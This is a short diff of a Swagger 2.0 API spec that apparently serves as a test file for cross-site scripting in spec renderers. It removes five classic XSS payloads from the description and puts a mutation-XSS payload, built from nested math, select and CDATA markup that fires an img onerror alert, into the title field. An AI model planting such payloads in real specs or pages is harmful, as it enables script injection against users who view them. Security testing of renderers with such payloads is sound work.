@@ -1,10 +1,5 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: "XSS Test Suite"
-  description: |
-    Test 1: <script>alert(document.domain)</script>
-    Test 2: <img src=x onerror=alert(1)>
-    Test 3: <svg onload=alert(1)>
-    Test 4: "><script>alert(1)</script>
-    Test 5: ' onclick='alert(1)
-  version: "1.0"
+  title: <math><mtext><select><![CDATA[</mtext><img src=x onerror=alert(document.domain)>]]>
+  description: Mutation XSS Test
+  version: 1.0
